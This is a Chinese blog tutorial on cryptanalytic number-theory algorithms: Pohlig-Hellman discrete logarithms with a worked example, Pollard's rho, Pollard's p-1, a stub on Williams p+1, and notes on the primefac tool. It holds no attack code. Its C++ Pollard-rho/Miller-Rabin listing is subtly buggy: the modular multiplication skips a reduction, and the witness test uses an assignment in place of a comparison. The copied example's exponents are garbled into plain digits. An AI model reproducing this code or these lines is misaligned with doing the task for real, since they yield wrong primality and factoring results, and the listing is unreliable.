<h3 id="0x2-Pohlig-Hellman算法"><a href="#0x2-Pohlig-Hellman算法" class="headerlink" title="0x2 Pohlig-Hellman算法"></a>0x2 Pohlig-Hellman算法</h3><p>此算法应用于密码学中比bsgs算法更广，而且效果也更佳！（因为bsgs算法所能求解的p值不能太大，位数多了就不能在有限时间内跑完）</p>
<p>原理： </p>
<p>问题： 已知a,b,p,以及p-1的分解质因数，求x使得 $a^x=b(mod\ p)$</p>
<p>设 $p-1=p_1^{e_1}*p_2^{e_2}...p_k^{e_k}$</p>
<p>若能有 $k$ 组可用的等式  $x=x_i\ (mod\ p_i^{e_i})$ ，就可以用中国剩余定理求解出 $x(mod\ p-1)$ </p>
<h4 id="2-1-求解-x-i"><a href="#2-1-求解-x-i" class="headerlink" title="2.1 求解$x_i$"></a>2.1 求解$x_i$</h4><p>对于 $p_i$ ，设   $x_i=c_0+c_1*p_i+c_2*p_i^2...c_{e_i-1}*p_i^{e_i-1}$ ，则  $x=x_i+s*p_i^{e_i}$</p>
<p><strong>求解 $c_0$ ：</strong></p>
<p>$b^{(p-1)/p_i}=(a^x)^{(p-1)/p_i}\ mod\ p$</p>
<p>$=(a^{c_0+c_1*p_i+c_2*p_i^2...c_{e_i-1}*p_i^{e_i-1}+s*p_i^{e_i}})^{(p-1)/p_i} \ mod\ p$</p>
<p>$=(a ^{c_0})^{(p-1)/p_i}\ mod\ p$</p>
<p>由于 $b^{(p-1)/p_i}$ 已知， 而 $c_0$ 取值范围只在$[0,p_i-1]$ ，因而在 $p_i$ 不是特别大的时候，完全是可解的。</p>
<p>有心的同学会发现，这个求解只需要在 $O(\lceil \sqrt{p_i} \rceil)$ 时间内就可求解，使用的仍是大步小步的思想。</p>
<p>设 $m=\lceil \sqrt{p_i}\ \rceil $ ，$c_0 = u*m - v$</p>
<p>则上式可表示为 $b^{(p-1)/p_i}*(a^{(p-1)/p_i})^v = (a^{m*(p-1)/p_i})^u$</p>
<p>利用hash表可以快速求解出来！</p>
<p><strong>求解 $c_i $ :</strong></p>
<p>基于上面的表达式，我们可以快速求解出$c_0$ 等值，然后求解$c_1$ ，依次求解，最终可以将所有解求出来。</p>
<p><strong>组合：</strong></p>
<p>$x_i=c_0+c_1*p_i+c_2*p_i^2+...+c_{e_i-1}*p_i^{e_i-1}$</p>
<h4 id="2-2-中国剩余定理求解x"><a href="#2-2-中国剩余定理求解x" class="headerlink" title="2.2 中国剩余定理求解x"></a>2.2 中国剩余定理求解x</h4><h4 id="2-3-范例"><a href="#2-3-范例" class="headerlink" title="2.3 范例"></a>2.3 范例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">Let the prime p = 8101, and a generator of Z8101 be a = 6. Find x so that</div><div class="line">ax = 7531 mod 8101.</div><div class="line"></div><div class="line">Observe that p-1 = 8100 = (22)(34)(52), is a product of small primes. We shall determine the numbers x2 = x mod (22), x3 = x mod (34) and x5 = x mod (52).</div><div class="line"></div><div class="line">Determination of x2.</div><div class="line">Since x2 is a number mod 4, we have x2 = c0 + c1 (2), with the coefficients being either 0 or 1. We determine these coefficients as follows.</div><div class="line">7531(p-1)/2 = 75314050 = -1 and as this = ac0 (p-1)/2, we have c0 = 1.</div><div class="line">Now, divide 7531 by ac0 to get</div><div class="line">7531(a-1) = 7531(6751) = 8006 mod p.</div><div class="line">8006(p-1)/4 = 80062025 = 1 and as this = ac1 (p-1)/2, we have c1 = 0.</div><div class="line"></div><div class="line">x2 = c0 + c1 (2) = 1 + 0(2) = 1.</div><div class="line"></div><div class="line">Determination of x3.</div><div class="line">Since x3 is a number mod 81, we have x3 = c0 + c1 (3) + c2 (9) + c3 (27), with the coefficients being either 0, 1 or 2. It will be of use to know the numbers a(p-1)/3 = 5883, and a2(p-1)/3 = 2217.</div><div class="line">7531(p-1)/3 = 2217, so c0 = 2.</div><div class="line">Now divide 7531 by ac0 to get</div><div class="line">7531(a-2) = 6735 mod p.</div><div class="line">6735(p-1)/9 = 1, so c1 = 0.</div><div class="line">Now divide 6735 by a3c1 to get</div><div class="line">6735(a0) = 6735 mod p.</div><div class="line">6735(p-1)/27 = 2217, so c2 = 2.</div><div class="line">Now divide 6735 by a9c2 to get</div><div class="line">6735(a-18) = 6992 mod p.</div><div class="line">6992(p-1)/81 = 5883, so c3 = 1.</div><div class="line"></div><div class="line">x3 = 2 + 0(3) + 2(9) + 1(27) = 47.</div><div class="line"></div><div class="line">Determination of x5.</div><div class="line">Since x5 is a number mod 25, x5 = c0 + c1 (5), with the coefficients being either 0, 1, 2, 3 or 4. We need to compute a(p-1)/5 = 3547, a2(p-1)/5 = 356, a3(p-1)/5 = 7077, a4(p-1)/5 = 5221.</div><div class="line">7531(p-1)/5 = 5221, so c0 = 4.</div><div class="line">Divide 7531 by ac0 to get</div><div class="line">7531(a-4) = 7613 mod p.</div><div class="line">7613(p-1)/25 = 356, so c1 = 2.</div><div class="line"></div><div class="line">x5 = 4 + 2(5) = 14.</div><div class="line"></div><div class="line">Determination of x.</div><div class="line">We now use the Chinese Remainder Theorem to compute the common solution of the congruences,</div><div class="line">x = 1 mod 4</div><div class="line">x = 47 mod 81</div><div class="line">x = 14 mod 25.</div><div class="line">M1 = 8100/(4) = 2025 </div><div class="line">y1 = M1-1 mod 4, y1 = 1.</div><div class="line">M2 = 8100/81 = 100</div><div class="line">y2 = M2-1 mod 81, y2 = 64.</div><div class="line"></div><div class="line">M3 = 8100/25 = 324</div><div class="line">y3 = M3-1 mod 25, y3 = 24.</div><div class="line"></div><div class="line">x = 1(2025)(1) + 47(100)(64) + 14(324)(24) = 6689 mod 8100.</div></pre></td></tr></table></figure>
<p>上文转载于 <a href="http://www-math.ucdenver.edu/~wcherowi/courses/m5410/phexam.html" target="_blank" rel="external">Pohlig-Hellman范例</a></p>
<h3 id="0x3-Pollard’s-rho算法"><a href="#0x3-Pollard’s-rho算法" class="headerlink" title="0x3 Pollard’s rho算法"></a>0x3 Pollard’s rho算法</h3><p>Pollard’s rho算法是一种常用的因数分解算法，对于分解因子较小的组合数特别有用。对于一个正整数n，在一般情况下，我们主要使用的是枚举1到n^(1/2)来求n的因子，所以算法复杂度是O(n^(1/2))。但是实际上有更好的办法，那就是Pollard&#39;s Rho算法，这个算法是一个随机化的算法，简单的说不是完全靠谱，一般我们认为它的平均算法复杂度是O(n^(1/4))。</p>
<h4 id="3-1-通过-𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲-𝐓𝐫𝐢𝐜𝐤-提高概率"><a href="#3-1-通过-𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲-𝐓𝐫𝐢𝐜𝐤-提高概率" class="headerlink" title="3.1 通过 𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲 𝐓𝐫𝐢𝐜𝐤 提高概率"></a>3.1 通过 𝐁𝐢𝐫𝐭𝐡𝐝𝐚𝐲 𝐓𝐫𝐢𝐜𝐤 提高概率</h4><p>我们随即地从[1,N]中选择一个数，这个数是 p 或者 q 的可能性是非常小的，所有我们不得不重复运行算法来提高概率。那么，我们现在可以提出一个不同的问题：<br>不再只选取一个整数，我们能够选取 𝑘 个数，并问是否存在𝑥𝑖 − 𝑥𝑗能够整除N</p>
<p>当 $k=\sqrt{N}$ 时，可能性跳高到了50%</p>
<p>策略：</p>
<blockquote>
<p>在区间[𝟐, 𝑵 − 𝟏]中随即选取 𝒌 个数，𝒙𝟏, … … , 𝒙𝒌<br>判断是否存在𝒈𝒄𝒅(𝒙𝒊 − 𝒙𝒚 , 𝑵) &gt; 𝟏, 若存在，𝒈𝒄𝒅(𝒙𝒊 − 𝒙𝒚 ,𝑵) 是𝑵的一个因子 ( 𝒑 或 𝒒 )</p>
</blockquote>
<p>但是很早就出现了一个问题，我们需要选取大约 𝑁^1/4 个数，<br>这个数量太大了，以至于我们并不能将其存放在内存中</p>
<h4 id="3-2-Pollard‘s-rho算法详解"><a href="#3-2-Pollard‘s-rho算法详解" class="headerlink" title="3.2 Pollard‘s rho算法详解"></a>3.2 Pollard‘s rho算法详解</h4><p>为了解决数太多无法存储的问题，Pollard′s rho algorithm 只将两个数存放在内存中。</p>
<p>我们并不随机生成 k 个数并两两进行比较，而是一个一个地生成并检查连续的两个数。反复执行这个步骤并希望能够得到我们想要的数。我们使用一个函数来生成伪随机数。换句话说，我们不断地使用函数 𝑓 来生成（看上去或者说感觉上像的）随机数。并不是所有的函都能够这样做，但是有一个神奇的函数可以。它就是</p>
<p>$𝑓(𝑥) = ( 𝑥^2 + 𝑎 ) mod 𝑁$</p>
<p>你可以发现对于大部分的数据这个算法能够正常运行，但是对于某些数据，它将会进入无限循环。为什么呢？这是因为存在 𝑓 环的原因。当它发生的时候，我们会在一个有限数集中进行无限循环。</p>
<p>例如，我们可以构造一个伪随机函数并生成如下伪随机数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2, 10, 16, 23, 29, 13, 16, 23, 29, 13 … …</div></pre></td></tr></table></figure>
<p>在这个例子中，我们最终将会在16, 23, 29, 13这个圈中无限循环，永远找不到因子。</p>
<p>那么，<strong>如何探测环的出现呢？</strong></p>
<p>一种方法是记录当前产生过的所有的数𝑥1, 𝑥2, … … 𝑥𝑛,并检测是否存在𝑥𝑙 = 𝑥𝑛(𝑙 &lt; 𝑛)。在实际过程中，当 𝑛 增长到一定大小时，可能会造成的内存不够用的情况。</p>
<p>另一种方法是由Floyd发明的一个算法，我们举例来说明这个聪明而又有趣的算法。假设我们在一个很长很长的圆形轨道上行走，我们如何知道我们已经走完了一圈呢？当然，我们可以像第一种方法那样做，但是更聪明的方法是让 A 和 B 按照 B 的速度是A 的速度的两倍从同一起点开始往前走，当 B 第一次敢上 A 时(也就是我们常说的套圈)，我们便知道，B 已经走了至少一圈了。</p>
<h4 id="3-3-算法实现"><a href="#3-3-算法实现" class="headerlink" title="3.3 算法实现"></a>3.3 算法实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;  </span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> times = <span class="number">50</span>;</div><div class="line"><span class="keyword">int</span> number = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="built_in">map</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>, <span class="keyword">int</span>&gt;m;</div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">Random</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">return</span> ((<span class="keyword">double</span>)rand( ) / RAND_MAX*n + <span class="number">0.5</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">q_mul</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b, <span class="keyword">long</span> <span class="keyword">long</span> mod )</span> <span class="comment">//快速乘法取模</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(b)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(b &amp; <span class="number">1</span>)</div><div class="line">		&#123;</div><div class="line">			ans += a;</div><div class="line">		&#125;</div><div class="line">		b /= <span class="number">2</span>;</div><div class="line">		a = (a + a) % mod;</div><div class="line"></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ans;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">q_pow</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b, <span class="keyword">long</span> <span class="keyword">long</span> mod )</span> <span class="comment">//快速乘法下的快速幂，叼</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>;</div><div class="line">	<span class="keyword">while</span>(b)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(b &amp; <span class="number">1</span>)</div><div class="line">		&#123;</div><div class="line">			ans = q_mul( ans, a, mod );</div><div class="line">		&#125;</div><div class="line">		b /= <span class="number">2</span>;</div><div class="line">		a = q_mul( a, a, mod );</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ans;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">witness</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> n )</span><span class="comment">//miller_rabin算法的精华</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> tem = n - <span class="number">1</span>;</div><div class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(tem % <span class="number">2</span> == <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		tem /= <span class="number">2</span>;</div><div class="line">		j++;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> x = q_pow( a, tem, n ); <span class="comment">//得到a^(n-1) mod n</span></div><div class="line">	<span class="keyword">if</span>(x == <span class="number">1</span> || x == n - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	<span class="keyword">while</span>(j--)</div><div class="line">	&#123;</div><div class="line">		x = q_mul( x, x, n );</div><div class="line">		<span class="keyword">if</span>(x = n - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">miller_rabin</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n )</span>  <span class="comment">//检验n是否是素数</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(n == <span class="number">2</span>)</div><div class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">	<span class="keyword">if</span>(n &lt; <span class="number">2</span> || n % <span class="number">2</span> == <span class="number">0</span>)</div><div class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= times; i++)  <span class="comment">//做times次随机检验</span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">long</span> <span class="keyword">long</span> a = Random( n - <span class="number">2</span> ) + <span class="number">1</span>; <span class="comment">//得到随机检验算子 a</span></div><div class="line">		<span class="keyword">if</span>(!witness( a, n ))  <span class="comment">//用a检验n是否是素数</span></div><div class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">gcd</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(b == <span class="number">0</span>)</div><div class="line">		<span class="keyword">return</span> a;</div><div class="line">	<span class="keyword">return</span> gcd( b, a%b );</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">pollard_rho</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n, <span class="keyword">long</span> <span class="keyword">long</span> c )</span><span class="comment">//找到n的一个因子</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> x, y, d, i = <span class="number">1</span>, k = <span class="number">2</span>;</div><div class="line">	x = Random( n - <span class="number">1</span> ) + <span class="number">1</span>;</div><div class="line">	y = x;</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">	&#123;</div><div class="line">		i++;</div><div class="line">		x = (q_mul( x, x, n ) + c) % n;</div><div class="line">		d = gcd( y - x, n );</div><div class="line">		<span class="keyword">if</span>(<span class="number">1</span>&lt;d&amp;&amp;d&lt;n)</div><div class="line">			<span class="keyword">return</span> d;</div><div class="line">		<span class="keyword">if</span>(y == x)<span class="comment">//找到循环，选取失败，重新来</span></div><div class="line">			<span class="keyword">return</span> n;</div><div class="line">		<span class="keyword">if</span>(i == k) <span class="comment">//似乎是一个优化，但是不是很清楚</span></div><div class="line">		&#123;</div><div class="line">			y = x;</div><div class="line">			k &lt;&lt;= <span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">( <span class="keyword">long</span> <span class="keyword">long</span> n, <span class="keyword">long</span> <span class="keyword">long</span> c )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(n == <span class="number">1</span>)</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	<span class="keyword">if</span>(miller_rabin( n ))</div><div class="line">	&#123;</div><div class="line">		m[n]++;</div><div class="line">		number++;</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> p = n;</div><div class="line">	<span class="keyword">while</span>(p &gt;= n)</div><div class="line">		p = pollard_rho( p, c-- );</div><div class="line">	find( p, c );</div><div class="line">	find( n / p, c );</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">long</span> <span class="keyword">long</span> tar;</div><div class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span> &gt;&gt; tar)</div><div class="line">	&#123;</div><div class="line">		number = <span class="number">0</span>;</div><div class="line">		m.clear();</div><div class="line">		find( tar, <span class="number">2137342</span> );</div><div class="line">		<span class="built_in">printf</span>( <span class="string">"%lld = "</span>, tar );</div><div class="line">		<span class="keyword">if</span>(m.empty())</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>( <span class="string">"%lld\n"</span>, tar );</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">for</span>(<span class="built_in">map</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>, <span class="keyword">int</span>&gt;::iterator c = m.begin(); c != m.end();)</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">printf</span>( <span class="string">"%lld^%d"</span>, c-&gt;first, c-&gt;second );</div><div class="line">			<span class="keyword">if</span>((++c) != m.end())</div><div class="line">				<span class="built_in">printf</span>( <span class="string">" * "</span> );</div><div class="line">		&#125;</div><div class="line">		<span class="built_in">printf</span>( <span class="string">"\n"</span> );</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="0x4-Pollard-39-s-p-1-算法"><a href="#0x4-Pollard-39-s-p-1-算法" class="headerlink" title="0x4 Pollard&#39;s p-1 算法"></a>0x4 Pollard&#39;s p-1 算法</h3><h4 id="4-1-smooth与powersmooth"><a href="#4-1-smooth与powersmooth" class="headerlink" title="4.1 smooth与powersmooth"></a>4.1 smooth与powersmooth</h4><p>如果一个整数的所有素因子都不大于B，我们称这个整数是B-Smooth数</p>
<p>如果一个整数的所有素因子的对应指数次幂不大于B，我们称这个整数是B-powersmooth数</p>
<p>$720({2^4}{3^2}{5^1})$ 是一个5-smooth数，6-smooth数，7-smooth数</p>
<p>但5^1\&lt;3^2\&lt;2^4=16，所以它也是一个16-powersmooth数</p>
<h4 id="4-2-原理解释"><a href="#4-2-原理解释" class="headerlink" title="4.2 原理解释"></a>4.2 原理解释</h4><p>n 是一个合数，其中一个质数位p，由费马小定理有：$a^{K(p-1)}=1(mod\ p)$</p>
<p>如果 $x=1(mod\ p)$ ，就有 $p|gcd(x-1,n)$</p>
<p>这个算法的思想就是构造p-1，其有多个素因子，并且每个素因子的powersmooth不超过B，开始时随机选取一个x， 计算 $x^w\ mod\ n$ , $w=\prod_{primes\ q\leq\ B}\ q^{\lfloor \log_{q}{B}\rfloor}$ ， 如果有$gcd(x^w, n)$ 不等于1， 那么我们就相当于找到一个素数p了</p>
<h4 id="4-3-算法"><a href="#4-3-算法" class="headerlink" title="4.3 算法"></a>4.3 算法</h4><p><strong>Inputs</strong>: n: a composite number<br><strong>Output</strong>: a nontrivial factor of n or failure</p>
<ol>
<li>select a smoothness bound B</li>
<li>define $M=\prod_{primes\ q\leq\ B}\ q^{\lfloor \log_{q}{B}\rfloor}$ (note: explicitly evaluating M may not be necessary)</li>
<li>randomly pick a coprime to n (note: we can actually fix a, e.g. if n is odd, then we can always select a = 2, random selection here is not imperative)</li>
<li>compute $g = gcd(a^M − 1, n)$ (note: exponentiation can be done modulo n)</li>
<li>if 1 &lt; g &lt; n then return g</li>
<li>if g = 1 then select a larger B and go to step 2 or return failure</li>
<li>if g = n then select a smaller B and go to step 2 or return failure</li>
</ol>
<p>这里的larger B和smaller B有选择性的方法，具体是啥我也不太清楚！ </p>
<h4 id="4-4-范例"><a href="#4-4-范例" class="headerlink" title="4.4 范例"></a>4.4 范例</h4><p>If we want to factor the number n = 299.</p>
<ol>
<li>We select B = 5.</li>
<li>Thus $M = 2^2 × 3^1 × 5^1$.</li>
<li>We select a = 2.</li>
<li>$g = gcd(a^M − 1, n) = 13$.</li>
<li>Since 1 &lt; 13 &lt; 299, thus return 13.</li>
<li>299 / 13 = 23 is prime, thus it is fully factored: 299 = 13 × 23.</li>
</ol>
<h3 id="0x5-Williams-39-s-p-1-算法"><a href="#0x5-Williams-39-s-p-1-算法" class="headerlink" title="0x5 Williams&#39;s p + 1 算法"></a>0x5 Williams&#39;s p + 1 算法</h3><p>Pollard&#39;s p-1算法比较容易懂，但是Williams’s p+1算法却不怎么让人明白！</p>
<h4 id="5-1-算法"><a href="#5-1-算法" class="headerlink" title="5.1 算法"></a>5.1 算法</h4><p>选择大于2的整数A，用其生成一个卢卡斯序列：</p>
<p>$V_0=2, V_1=A,V_j=AV_{j-1}-V_{j-2}$</p>
<h3 id="0xn-smooth质数"><a href="#0xn-smooth质数" class="headerlink" title="0xn smooth质数"></a>0xn smooth质数</h3><h4 id="n-1-p-1-光滑"><a href="#n-1-p-1-光滑" class="headerlink" title="n.1 p - 1 光滑"></a>n.1 p - 1 光滑</h4><p>当 p 是 N 的因数，并且 p - 1 是光滑的时候，可能可以使用 Pollard&#39;s p − 1 算法来分解 N，但是也不是完全可以成功的。</p>
<h4 id="n-2-p-1-光滑"><a href="#n-2-p-1-光滑" class="headerlink" title="n.2 p + 1 光滑"></a>n.2 p + 1 光滑</h4><p>当 p 是 n 的因数，并且 p + 1 是光滑的时候，可能可以使用 Williams&#39;s p + 1 算法来分解 N，但是也不是完全可以成功的。</p>
<h4 id="n-3-primefac包"><a href="#n-3-primefac包" class="headerlink" title="n.3 primefac包"></a>n.3 primefac包</h4><p>上面的两种光滑，都可以使用包<a href="https://pypi.python.org/pypi/primefac" target="_blank" rel="external">primefac</a> 来做</p>
<p>primefac是一个贼好用的工具，环境一般在linux上，cygwin上也能用，运行速度贼快！</p>
<font color="#f00">不能在windows上使用的原因</font>

<p>在Windows中，多进程multiprocessing使用的是序列化pickle来在多进程之间转移数据，而socket对象是不能被序列化的，但是在linux操作系统上却没问题，因为在linux上多进程multiprocessing使用的是fork，所以在windows上可以改用多线程。</p>
<p>常用的命令行使用方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python -m primefac [-vs] [-v|--verbose] [-s|--summary] [-t=NUM] [-r=NUM]</div><div class="line">                [-m=[prb][,p-1][,p+1][,ecm][,mpqs]] rpn</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line">rpn is an expression in revese Polish notation and is evaluated using integer arithmetic. Each number that remains on the stack after evaluation is then factored.</div><div class="line"></div><div class="line">-t sets the trial division limit; the default value is 1000. Use -t=inf to use trial division exclusively.</div><div class="line"></div><div class="line">-r sets the number of rounds of Pollard’s rho algorithm to try before calling a factor “difficult”. The default value is 42,000. Use -r=inf to use Pollard’s rho exclusively once the trial division is completed.</div><div class="line"></div><div class="line">If verbosity is invoked, we indicate in the output which algorithm produced which factors during the multifactor phase.</div><div class="line"></div><div class="line">If the -s (or --summary) flag is absent, then output is identical to the output of the GNU factor command, except possibly for the order of the factors and, if verbosity has been turned on, the annotations indicating which algorithm produced which factors.</div><div class="line"></div><div class="line">If the -s (or --summary) flag is present, then output is modified by adding a single newline between each item’s output, before the first item, and after the last item. Each item’s output is also modified by printing a second line of data summarizing the results by describing the number of decimal digits in the 